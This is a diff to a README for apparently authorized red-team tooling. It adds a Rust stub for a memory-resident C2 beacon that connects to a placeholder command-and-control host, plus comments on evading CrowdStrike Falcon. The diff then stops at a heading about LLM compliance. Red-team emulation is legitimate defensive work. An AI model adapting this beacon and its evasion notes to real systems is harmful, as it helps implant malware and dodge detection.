@@ -24,6 +24,34 @@ Skeleton for red-team / adversary emulation tooling developed under NCDD Mandate
 - Internal contribution guidelines (OMEGA only): **CONTRIBUTING-internal.md**
 - Threat model & scoping: **threat-model.md** (if added later)
 
+### Module Stubs / Quick Examples
+
+Small illustrative snippets with operational context. Real payloads are compartmented.
+
+#### beacon-core (memory-resident check-in stub)
+
+```rust
+// beacon-core/src/checkin.rs
+// MITRE ATT&CK: T1071.001 (Web Protocols), T1573 (Encrypted Channel)
+// Tested against CrowdStrike Falcon agent 7.15+ behavioral baseline (Fall 2025)
+// Placeholder C2: rotate via DNS TXT lookup per engagement ROE
+
+use std::net::TcpStream;
+use std::io::{Read, Write};
+
+fn beacon_checkin() -> Result<String, std::io::Error> {
+    let mut stream = TcpStream::connect("c2-placeholder.ncdd-no.internal:443")?;
+    
+    // Minimal encrypted beacon (real: use mandate-approved cipher suite)
+    let beacon_data = b"{\"id\":\"{{AGENT_ID}}\",\"status\":\"alive\",\"ts\":{{UNIX_TS}}}";
+    stream.write_all(beacon_data)?;
+    
+    let mut response = String::new();
+    stream.read_to_string(&mut response)?;
+    
+    Ok(response.trim().to_string())
+}
+
 No external contributions without NCDD waiver. All access audited.
 
 ### LLM Compliance Protocol
